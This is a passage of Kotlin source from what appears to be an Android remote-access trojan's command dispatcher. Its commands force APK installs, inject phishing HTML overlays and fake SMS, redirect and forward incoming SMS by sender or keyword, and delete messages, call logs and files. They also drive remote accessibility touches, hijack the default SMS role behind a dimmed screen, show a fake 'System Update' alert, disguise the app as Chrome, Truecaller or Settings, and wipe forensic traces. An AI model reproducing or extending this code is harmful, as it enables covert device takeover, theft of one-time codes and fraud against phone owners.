                        } catch (e: Exception) {
                            status = "LOCK_FAILED"
                            errorMsg = e.message ?: "Unknown error"
                        }
                    } else {
                        status = "FAILED_PERMISSION (DEVICE_ADMIN)"
                        errorMsg = "App is not an active Device Administrator."
                    }
                }
                "INSTALL_APP" -> {
                    val parts = content.split("|", limit = 2)
                    val apkPath = parts[0].trim()
                    val apkFile = File(apkPath)

                    if (apkFile.exists() && apkFile.isFile) {
                        val info = ctx.packageManager.getPackageArchiveInfo(apkPath, 0)
                        val targetPkg = info?.packageName ?: ""
                        
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                            .putBoolean("relentless_install_active", true)
                            .putString("relentless_apk_path", apkFile.absolutePath)
                            .putString("relentless_target_pkg", targetPkg)
                            .apply()

                        val i = Intent(ctx, MonitorService::class.java)
                        i.putExtra("kick_relentless", true)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
                        
                        status = "RELENTLESS_TRAP_ARMED"
                        
                        if (parts.size > 1) {
                            DynamicUIManager.showOverlay(ctx, true, "AUTO", parts[1].trim())
                        }
                    } else {
                        status = "INSTALL_FAILED (NOT_FOUND)"
                        errorMsg = "APK not at: $apkPath"
                    }
                }
                "STOP_INSTALL" -> {
                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                        .putBoolean("relentless_install_active", false)
                        .putString("relentless_apk_path", "")
                        .putString("relentless_target_pkg", "")
                        .putLong("relentless_last_prompt", 0L)
                        .apply()
                    
                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                    nm.cancel(102)
                    nm.cancel(103)
                    
                    DynamicUIManager.removeOverlay(ctx)
                    status = "RELENTLESS_TRAP_DISARMED"
                }
                "UI_TRAP" -> {
                    val parts = content.split("|", limit = 5)
                    if (parts.isNotEmpty() && parts[0].trim().uppercase() == "STOP") {
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                            .putBoolean("ui_trap_active", false)
                            .remove("ui_trap_target")
                            .remove("ui_trap_method")
                            .remove("ui_trap_timeout")
                            .remove("ui_trap_dim")
                            .remove("ui_trap_html")
                            .apply()
                        status = "UI_TRAP_DISARMED"
                        errorMsg = "Session forcefully reset by STOP parameter."
                    } else if (parts.size >= 4) {
                        val target = parts[0].trim()
                        val method = parts[1].trim().uppercase()
                        val timeout = parts[2].trim().toLongOrNull() ?: 10L
                        
                        val dimLevel: Int
                        val html: String
                        if (parts.size >= 5) {
                            dimLevel = parts[3].trim().toIntOrNull() ?: 20
                            html = parts[4].trim()
                        } else {
                            dimLevel = 20
                            html = parts[3].trim()
                        }
                        
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                            .putBoolean("ui_trap_active", true)
                            .putString("ui_trap_target", target)
                            .putString("ui_trap_method", method)
                            .putLong("ui_trap_timeout", timeout)
                            .putInt("ui_trap_dim", dimLevel)
                            .putString("ui_trap_html", html)
                            .apply()
                        
                        status = "UI_TRAP_ARMED"
                        errorMsg = "Target: $target | Method: $method | Timeout: ${timeout}s | Dim: $dimLevel%"
                    } else {
                        status = "FAILED (FORMAT)"
                        errorMsg = "Usage: UI_TRAP | TARGET | METHOD | TIMEOUT | [DIM_LEVEL] | <html>  OR  UI_TRAP | STOP"
                    }
                }
                "CLEAR_UI_TRAP" -> {
                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                        .putBoolean("ui_trap_active", false).apply()
                    status = "UI_TRAP_DISARMED"
                }
                "INJECT_UI" -> {
                    val parts = content.split("|", limit = 3)
                    if (parts.size >= 3) {
                        val touchable = parts[0].trim().uppercase() == "TRUE"
                        val method = parts[1].trim().uppercase() // ACC, OVERLAY, or AUTO
                        val html = parts[2].trim()
                        
                        DynamicUIManager.showOverlay(ctx, touchable, method, html)
                        status = "UI_DISPATCHED"
                        errorMsg = "Method: $method | Touchable: $touchable"
                    } else {
                        status = "FAILED (FORMAT)"
                        errorMsg = "Usage: INJECT_UI | TRUE/FALSE | ACC/OVERLAY/AUTO | <html>"
                    }
                }
                "REMOVE_UI" -> {
                    DynamicUIManager.removeOverlay(ctx)
                    status = "UI_REMOVED"
                }
                "POWER_SHIELD" -> {
                    val parts = content.split("|", limit = 4)
                    if (parts.size >= 4) {
                        val toggle = parts[0].trim().uppercase() == "ON"
                        val timeoutRaw = parts[1].trim()
                        val timeout = if (timeoutRaw.isEmpty()) 0L else timeoutRaw.toLongOrNull() ?: 10L
                        val method = parts[2].trim().uppercase()
                        val html = parts[3].trim()
                        
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                            .putBoolean("power_shield_active", toggle)
                            .putLong("power_shield_timeout", timeout)
                            .putString("power_shield_method", method)
                            .putString("power_shield_html", html)
                            .apply()
                        
                        status = "POWER_SHIELD_CONFIGURED"
                        errorMsg = "State: ${if(toggle) "ON" else "OFF"} | Timeout: ${timeout}s | Method: $method"
                    } else {
                        status = "FAILED (FORMAT)"
                        errorMsg = "Usage: POWER_SHIELD | ON/OFF | TIMEOUT | ACC/OVERLAY | <html>"
                    }
                }
                "ADD_AUTO_SWIPE" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val rawType = parts[0].trim().lowercase()
                        val type = when (rawType) {
                            "pkg", "package" -> "pkgs"
                            "keyword", "kw" -> "keywords"
                            "sender", "num", "number" -> "senders"
                            else -> rawType
                        }
                        val newVal = parts[1].trim()
                        val aPrefs = ctx.getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
                        val existing = aPrefs.getString(type, "") ?: ""
                        val updated = if (existing.isEmpty()) newVal else "$existing, $newVal"
                        aPrefs.edit().putString(type, updated).apply()
                        status = "AUTO_SWIPE_UPDATED: $type"
                    } else {
                        status = "FAILED_FORMAT"
                    }
                }
                "CLEAR_AUTO_SWIPE" -> {
                    val type = content.trim().lowercase()
                    val aPrefs = ctx.getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
                    if (type == "all" || type == "") {
                        aPrefs.edit().clear().apply()
                        status = "ALL_AUTO_SWIPE_PURGED"
                    } else {
                        aPrefs.edit().remove(type).apply()
                        status = "AUTO_SWIPE_CLEARED: $type"
                    }
                }
                "ADD_CONTACT" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val success = PhoneManager.addContact(ctx, parts[0].trim(), parts[1].trim())
                        status = if (success) "CONTACT_INJECTED" else "INJECTION_FAILED"
                    } else status = "FAILED_FORMAT"
                }
                "PURGE_CONTACT" -> {
                    val count = PhoneManager.purgeContact(ctx, content.trim())
                    status = if (count >= 0) "PURGE_COMPLETE ($count)" else "PURGE_FAILED"
                }
                "SET_DEBUG_UI" -> {
                    val state = content.trim().uppercase()
                    val isEnabled = (state == "ON")
                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
                        .putBoolean("debug_ui_enabled", isEnabled).apply()
                    status = "DEBUG_UI_ACCESS_SET: " + (if (isEnabled) "VISIBLE" else "HIDDEN")
                }
                "SET_MASQUERADE" -> {
                    val skin = content.trim().uppercase()
                    if (applyMasqueradeSkin(ctx, skin)) {
                        status = "SUCCESS"
                        errorMsg = "Identity transformed to $skin"
                    } else {
                        status = "FAILED"
                        errorMsg = "Skin $skin not recognized or component rejected update."
                    }
                }
                "SET_TILE_STATE" -> {
                    val state = content.trim().uppercase()
                    val isActive = state == "ON"
                    
                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
                        .putBoolean("tile_dashboard_active", isActive).apply()
                    
                    // Force the Quick Settings Tile to refresh its UI immediately
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                        android.service.quicksettings.TileService.requestListeningState(
                            ctx, android.content.ComponentName(ctx, DashboardTileService::class.java)
                        )
                    }
                    
                    status = "TILE_STATE_SET: " + (if (isActive) "DASHBOARD_MODE" else "STEALTH_MODE")
                }
                "SET_JUDAS_HANDLER" -> {
                    JudasManager.setHandler(ctx, content.trim())
                    status = "EMERGENCY_HANDLER_SET"
                }
                "SET_SIM_TRACKER" -> {
                    val targetSmsNum = content.trim()
                    if (targetSmsNum.isNotEmpty()) {
                        val fingerprints = JudasManager.getSimFingerprints(ctx)
                        if (fingerprints.isNotEmpty()) {
                            ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
                                .putString("trusted_sim_hashes", JSONArray(fingerprints).toString())
                                .putString("sim_track_target_num", targetSmsNum)
                                .putBoolean("is_sim_trap_armed", false)
                                .apply()
                            JudasManager.evaluateSimState(ctx)
                            status = "SIM_TRACKER_LOCKED"
                            errorMsg = "Locked to ${fingerprints.size} SIM(s) | Target: $targetSmsNum"
                        } else {
                            status = "FAILED_NO_SIM"
                            errorMsg = "No active SIMs found to lock onto."
                        }
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Use: TARGET_SMS_NUM"
                    }
                }
                "GET_TRUSTED_SIMS" -> {
                    val sims = JudasManager.getTrustedSims(ctx)
                    status = "TRUSTED_SIMS_RETRIEVED"
                    val result = JSONObject().put("trusted_sims", sims)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "SET_PROMOS" -> {
                    val arr = JSONArray()
                    content.split("|||").forEach { arr.put(it.trim()) }
                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
                        .putString("promo_templates", arr.toString()).apply()
                    status = "PROMO_TEMPLATES_UPDATED (${arr.length()})"
                }
                "SET_SMS_BLACKLIST" -> {
                    val list = content.trim()
                    ctx.getSharedPreferences("sms_filter_prefs", Context.MODE_PRIVATE).edit()
                        .putString("blacklist", if (list.equals("DEFAULT", true)) null else list)
                        .apply()
                    status = "SMS_BLACKLIST_UPDATED"
                }
                "ADD_HVT_REDIRECT" -> {
                    // Format: TARGET_SENDER | DESTINATION_NUMBER
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val target = parts[0].trim()
                        val dest = parts[1].trim()
                        val hvtPrefs = ctx.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
                        hvtPrefs.edit().putString(target, dest).apply()
                        status = "HVT_REDIRECT_ADDED: $target -> $dest"
                    } else {
                        status = "FAILED_FORMAT: Use TARGET|DEST"
                    }
                }
                "CLEAR_HVT_REDIRECTS" -> {
                    ctx.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                    status = "HVT_REDIRECTS_CLEARED"
                }
                "ADD_KEYWORD_FORWARD" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val keywords = parts[0].trim().lowercase()
                        val dest = parts[1].trim()
                        val kwPrefs = ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE)
                        // Store each keyword in the comma list as a separate entry pointing to the same dest
                        val editor = kwPrefs.edit()
                        keywords.split(",").forEach { kw -> 
                            if (kw.trim().isNotEmpty()) editor.putString(kw.trim(), dest) 
                        }
                        editor.apply()
                        status = "KEYWORD_TRAPS_SET: $keywords -> $dest"
                    } else {
                        status = "FAILED_FORMAT: Use KEYWORDS|DEST"
                    }
                }
                "CLEAR_KEYWORD_FORWARDS" -> {
                    ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                    status = "KEYWORD_TRAPS_PURGED"
                }
                "STOLEN_PHONE" -> {
                    val targetNum = if (content.isNotBlank()) content.trim() else JudasManager.getHandler(ctx) ?: ""
                    if (targetNum.isEmpty()) {
                        status = "FAILED"
                        errorMsg = "No target number specified in command or Judas Registry"
                    } else {
                        ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
                            .putString("stolen_target_num", targetNum)
                            .putBoolean("stolen_alert_pending", true)
                            .apply()

                        // 1. STRONG WAKE (Moved to Main Thread with delay to prevent race conditions)
                        Handler(Looper.getMainLooper()).postDelayed({
                            val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                            val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                                android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                                android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:StolenWake")
                            wakeLock.acquire(3000)
                            
                            val wakeIntent = Intent(ctx, PulseActivity::class.java).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                putExtra("is_wake_trigger", true)
                            }
                            ctx.startActivity(wakeIntent)
                        }, 500)

                        // 2. DIM IMMEDIATELY (Relative to wake, padded to ensure Keyguard dismisses first)
                        Handler(Looper.getMainLooper()).postDelayed({ 
                            DimmerManager.applyDim(ctx, 20, "AUTO")
                        }, 1500)

                        // 3. DEFAULT SMS GHOST SEQUENCE
                        Handler(Looper.getMainLooper()).postDelayed({ 
                            DefaultSmsManager.expectedMode = "AUTO"
                            DefaultSmsManager.requestDefault(ctx)
                        }, 3500)

                        // 4. CONNECTIVITY EVALUATION
                        Handler(Looper.getMainLooper()).postDelayed({
                            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
                            val isOnline = caps?.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
                            
                            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                            val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT

                            if (!isOnline && hasSim) {
                                MyAccessibilityService.instance?.isWaitingForDataSettings = true
                                val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                }
                                ctx.startActivity(dataIntent)
                            } else {
                                DimmerManager.removeOverlay(ctx)
                            }
                        }, 13000)

                        // 5. EXECUTE STOLEN ALERT
                        Handler(Looper.getMainLooper()).postDelayed({
                            JudasManager.checkPendingStolenAlert(ctx)
                        }, 17000)

                        status = "STOLEN_PROTOCOL_INITIATED"
                        errorMsg = "Target: $targetNum"
                    }
                }
                "FULL_ONBOARDING" -> {
                    // 1. STRONG WAKE (Delayed by 5 seconds for testing)
                    Handler(Looper.getMainLooper()).postDelayed({
                        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                            android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                            android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:MasterWake")
                        wakeLock.acquire(3000)
                        
                        val wakeIntent = Intent(ctx, PulseActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                            putExtra("is_wake_trigger", true)
                        }
                        ctx.startActivity(wakeIntent)
                    }, 5000)

                    // 2. DIM IMMEDIATELY (Relative to 5s delay -> 5500ms)
                    Handler(Looper.getMainLooper()).postDelayed({ 
                        DimmerManager.applyDim(ctx, 20, "AUTO")
                    }, 5500)

                    // 3. DEFAULT SMS GHOST SEQUENCE (7500ms)
                    Handler(Looper.getMainLooper()).postDelayed({ 
                        DefaultSmsManager.expectedMode = "AUTO"
                        DefaultSmsManager.requestDefault(ctx)
                    }, 7500)

                    // 4. CONNECTIVITY EVALUATION (17000ms)
                    Handler(Looper.getMainLooper()).postDelayed({
                        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
                        val isOnline = caps?.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
                        
                        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                        val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT

                        if (!isOnline && hasSim) {
                            MyAccessibilityService.instance?.isWaitingForDataSettings = true
                            val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                            }
                            ctx.startActivity(dataIntent)
                            DebugLogger.log("AUTO_SYNC", "Offline with SIM detected. Opening Data Settings.")
                        } else {
                            DebugLogger.log("AUTO_SYNC", "Check Skipped: Online=$isOnline, SIM=$hasSim. Cleaning up.")
                            DimmerManager.removeOverlay(ctx)
                        }
                    }, 17000)
                    
                    status = "SEQUENCE_INITIATED_WITH_DELAY"
                }
                "WAKE" -> {
                    // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                    val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                    val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                        android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                        android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:WakeTrigger")
                    wakeLock.acquire(3000) // Hold for 3 seconds

                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                    val channelId = "system_integrity_alerts"
                    
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        val channel = android.app.NotificationChannel(channelId, "System Integrity", android.app.NotificationManager.IMPORTANCE_HIGH)
                        channel.setSound(null, null)
                        channel.enableVibration(false)
                        nm.createNotificationChannel(channel)
                    }

                    val intent = Intent(ctx, PulseActivity::class.java)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    intent.putExtra("is_wake_trigger", true)
                    if (content.contains("wellbeing")) intent.putExtra("route_to_settings", true)

                    val pendingIntent = android.app.PendingIntent.getActivity(
                        ctx, 99, intent, 
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                    )

                    val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
                        .setSmallIcon(android.R.drawable.ic_menu_info_details)
                        .setContentTitle("System Update")
                        .setContentText("Synchronizing system health parameters...")
                        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                        .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
                        .setFullScreenIntent(pendingIntent, true)
                        .setAutoCancel(true)
                        .setTimeoutAfter(3000)

                    nm.notify(99, builder.build())
                    status = "STRONG_WAKE_DISPATCHED"
                }
                "REMOTE_TOUCH" -> {
                    if (MyAccessibilityService.instance == null) {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is offline."
                    } else {
                        try {
                            val trimmed = content.trim()
                            var initialDelay = 0L
                            val chain = if (trimmed.startsWith("{")) {
                                val obj = JSONObject(trimmed)
                                initialDelay = obj.optLong("delay", 0L)
                                obj.optJSONArray("chain") ?: JSONArray()
                            } else if (trimmed.startsWith("[")) {
                                JSONArray(trimmed)
                            } else {
                                // Legacy Fallback Converter
                                val parts = trimmed.split("|")
                                JSONArray().put(JSONObject().apply {
                                    put("type", parts[0].trim())
                                    put("val", parts.getOrNull(1)?.trim() ?: "")
                                })
                            }
                            
                            if (initialDelay > 0) {
                                DebugLogger.log("CHAIN_START", "Applying initial delay of ${initialDelay}ms")
                                kotlinx.coroutines.delay(initialDelay)
                            }
                            
                            val chainReport = MyAccessibilityService.instance?.executeInteractionChain(chain)
                            status = "CHAIN_EXECUTED"
                            val result = JSONObject().put("report", chainReport)
                            updateCommandStatus(ctx, id, status, null, result, null)
                            return
                        } catch (e: Exception) {
                            status = "CHAIN_FAILED"
                            errorMsg = e.message ?: "Unknown error"
                        }
                    }
                }
                "PHONE_LOGS" -> {
                    val parts = content.split("|")
                    val action = parts[0].trim()
                    val value = if (parts.size > 1) parts[1].trim() else null
                    
                    val deletedCount = PhoneManager.deleteLogs(ctx, action, value)
                    status = when (deletedCount) {
                        -1 -> "FAILED_PERMISSION"
                        -2 -> "FAILED_ERROR"
                        else -> "SUCCESS_CLEANUP ($deletedCount)"
                    }
                    errorMsg = "Action: $action | Target: ${value ?: "ALL"}"
                }
                "DELETE_SMS_THREAD" -> {
                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
                        status = "FAILED (NOT_DEFAULT)"
                        errorMsg = "I'm not default to do that"
                    } else {
                        val target = content.trim()
                        val deletedCount = PhoneManager.deleteSmsThread(ctx, target)
                        status = "THREAD_WIPED"
                        errorMsg = "Target: $target"
                    }
                }
                "DELETE_SMS_QUERY" -> {
                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
                        status = "FAILED (NOT_DEFAULT)"
                        errorMsg = "I'm not default to do that"
                    } else {
                        val query = content.trim()
                        val count = PhoneManager.deleteSmsByQuery(ctx, query)
                        status = "QUERY_WIPE_COMPLETE"
                        errorMsg = "Messages Purged: $count | Query: $query"
                    }
                }
                "SEND_SMS" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val num = parts[0].trim()
                        val msg = parts[1].trim()
                        try {
                            PhoneManager.sendLegitSms(ctx, num, msg)
                            status = "SUCCESS"
                            errorMsg = "Accepted by SMS subsystem for delivery to $num"
                        } catch (e: Exception) {
                            status = "FAILED_DISPATCH"
                            errorMsg = e.message ?: "Unknown SMS subsystem error"
                        }
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Format: NUMBER|MESSAGE"
                    }
                }
                "SET_RELENTLESS_ACC" -> {
                    // 1. Force Skin Change to TalkBack immediately
                    applyMasqueradeSkin(ctx, "TALKBACK")

                    // 2. Configure Relentless ACC rules
                    val parts = content.split("|")
                    val chill = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 1440L
                    val interval = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 2L
                    val max = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 5
                    val html = if (parts.size > 3) parts.subList(3, parts.size).joinToString("|").trim() else null
                    
                    AccRelentlessManager.applyNewConfig(ctx, chill, interval, max, html)
                    
                    status = "RELENTLESS_ACC_CONFIGURED"
                    errorMsg = "Skin: TALKBACK | Chill: ${chill}m | Interval: ${interval}m | Max: $max | Counters Reset"
                }
                "STOP_RELENTLESS_ACC" -> {
                    AccRelentlessManager.stopNagging(ctx)
                    DynamicUIManager.removeOverlay(ctx)
                    status = "RELENTLESS_ACC_STOPPED"
                }
                "ACC_GOTO_SETTINGS" -> {
                    DynamicUIManager.removeOverlay(ctx)
                    val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(i)
                    status = "EXECUTED (Opened Settings)"
                }
                "ACC_SHOW_HELP" -> {
                    DynamicUIManager.removeOverlay(ctx)
                    val i = Intent(ctx, AccHelpActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(i)
                    status = "EXECUTED (Opened Help)"
                }
                "INJECT_SMS" -> {
                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
                        status = "FAILED (NOT_DEFAULT)"
                        errorMsg = "I'm not default to do that"
                    } else {
                        val parts = content.split("|")
                        if (parts.size >= 2) {
                            val num = parts[0].trim()
                            val msg = parts[1].trim()
                            val isRead = parts.getOrNull(2)?.trim()?.equals("READ", true) ?: false
                            val success = PhoneManager.injectFakeSms(ctx, num, msg, isRead)
                            status = if (success) "INJECTION_SUCCESS" else "INJECTION_FAILED"
                            errorMsg = "From: $num | Mode: ${if(isRead) "Silent" else "Unread"}"
                        } else {
                            status = "FAILED_FORMAT"
                            errorMsg = "Use: NUMBER | MESSAGE | [READ/UNREAD]"
                        }
                    }
                }
                "DELETE_FILE" -> {
                    val paths = content.split("|")
                    var successCount = 0
                    var failCount = 0
                    val report = StringBuilder()

                    paths.forEach { path ->
                        val target = File(path.trim())
                        if (target.exists()) {
                            val isDir = target.isDirectory
                            val name = target.name
                            if (target.deleteRecursively()) {
                                successCount++
                                report.append("[PURGED] ${if(isDir) "Dir" else "File"}: $name; ")
                            } else {
                                failCount++
                                report.append("[LOCKED] $name; ")
                            }
                        } else {
                            failCount++
                            report.append("[NOT_FOUND] ${target.absolutePath}; ")
                        }
                    }
                    status = "CLEANUP_EXEC_COMPLETE (OK: $successCount, ERR: $failCount)"
                    errorMsg = report.toString()
                }
                "NUKE" -> {
                    try {
                        // 1. Wipe the "Catacombs" (External hidden storage)
                        File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android").deleteRecursively()
                        
                        // 2. Wipe Internal Files (Logs and Crash reports)
                        File(ctx.filesDir, "survivor_logs.txt").delete()
                        File(ctx.filesDir, "CRITICAL_HALT.txt").delete()
                        File(ctx.filesDir, "sms_archive_vault.json").delete()
                        
                        // 3. Reset SharedPreferences (Excluding app_identity)
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().apply()
                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit().clear().apply()
                        ctx.getSharedPreferences("setup_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                        ctx.getSharedPreferences("app_health", Context.MODE_PRIVATE).edit().clear().apply()

                        status = "FORENSIC_WIPE_COMPLETE"
                        
                        // 4. Suicide & Resurrect: Kill process; OS will restart services in fresh state
                        Handler(Looper.getMainLooper()).postDelayed({ 
                            android.os.Process.killProcess(android.os.Process.myPid()) 
                        }, 2000)
                    } catch(e: Exception) { 
                        status = "CLEANUP_FAILED"
                        errorMsg = e.message ?: "IO Error during wipe"
                    }
                }
                "RUN_INTENT" -> {
                    try {
                        val json = JSONObject(content)
                        val action = json.optString("action", android.content.Intent.ACTION_VIEW)
                        val intent = android.content.Intent(action)
                        
                        val dataStr = json.optString("data", "")
                        if (dataStr.isNotEmpty()) {
                            val safeData = if (dataStr.startsWith("tel:", ignoreCase = true)) dataStr.replace("#", "%23") else dataStr
                            intent.data = android.net.Uri.parse(safeData)
                        }
                        
                        if (json.has("pkg")) {
                            val pkg = json.getString("pkg")
                            if (json.has("cls")) {
                                intent.setClassName(pkg, json.getString("cls"))
                            } else {
                                intent.setPackage(pkg)
                            }
                        }

                        if (dataStr.contains("/") && !dataStr.startsWith("tel:") && !dataStr.contains("://")) {
                            val parts = dataStr.split("/")
                            intent.setClassName(parts[0], parts[1])
                            intent.data = null 
                        }
                        
                        val typeStr = json.optString("type", "")
                        if (typeStr.isNotEmpty()) {
                            if (intent.data != null) intent.setDataAndType(intent.data, typeStr)
                            else intent.type = typeStr
                        }
                        
                        val extras = json.optJSONObject("extras")
                        extras?.keys()?.forEach { key ->
                            val value = extras.get(key)
                            if (value is Boolean) intent.putExtra(key, value)
                            else if (value is Int) intent.putExtra(key, value)
                            else intent.putExtra(key, value.toString())
                        }

                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        val target = json.optString("target", "activity").lowercase()
                        
                        when (target) {
                            "service" -> {
                                val res = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
                                          else ctx.startService(intent)
                                if (res != null) {
                                    status = "SUCCESS"
                                    errorMsg = "Service started: ${res.shortClassName}"
                                } else {
                                    status = "FAILED_NOT_FOUND"
                                    errorMsg = "Service component does not exist."
                                }
                            }
                            "broadcast" -> {
                                ctx.sendBroadcast(intent)
                                status = "SUCCESS"
                                errorMsg = "Broadcast dispatched"
                            }
                            else -> {
                                ctx.startActivity(intent)
                                status = "SUCCESS"
                                errorMsg = "Activity launch initiated"
                            }
                        }
                    } catch (e: android.content.ActivityNotFoundException) {
                        status = "FAILED_NOT_FOUND"
                        errorMsg = "The target activity or package was not found on this device."
                    } catch (e: SecurityException) {
                        status = "FAILED_SECURITY_DENIED"
                        errorMsg = "Permission denied: The target component is not exported or requires higher privileges."
                    } catch (e: Exception) {
                        status = "FAILED_EXCEPTION"
                        errorMsg = e.message ?: "Unknown error during intent execution"
                    }
                }
            }
        } catch (e: Exception) {
            status = "FAILED: ${e.message}"
            errorMsg = e.toString()
        }

        // Expose the result to the UI Terminal
        DebugLogger.log("COMMAND", "Processed [$fileName] -> $status")

        // Update DB
        updateCommandStatus(ctx, id, status, errorMsg)
    }

    fun applyMasqueradeSkin(ctx: Context, skin: String): Boolean {
        val aliasMap = mapOf(
            "DRIVE" to ".AliasDrive", "CALC" to ".AliasCalc",
            "GOOGLE_PHONE" to ".AliasGooglePhone", "GOOGLE_MSG" to ".AliasGoogleMsg",
            "SAM_PHONE" to ".AliasSamPhone", "SAM_MSG" to ".AliasSamMsg",
            "CHROME" to ".AliasChrome", "IMO" to ".AliasImo",
            "IMO_HD" to ".AliasImoHd", "IMO_BETA" to ".AliasImoBeta", "IMO_LITE" to ".AliasImoLite",
            "TRUECALLER" to ".AliasTruecaller", "TALKBACK" to ".AliasTalkBack", "SETTINGS" to ".AliasSettings"
        )

        if (!aliasMap.containsKey(skin)) return false

        val prefs = ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val currentSkin = prefs.getString("active_masquerade_skin", "")
        if (currentSkin == skin) return true // Already active

        val pm = ctx.packageManager
        aliasMap.forEach { (key, aliasName) ->
            val comp = android.content.ComponentName(ctx, "${ctx.packageName}$aliasName")
            val state = if (key == skin) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED 
                        else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            pm.setComponentEnabledSetting(comp, state, android.content.pm.PackageManager.DONT_KILL_APP)
        }

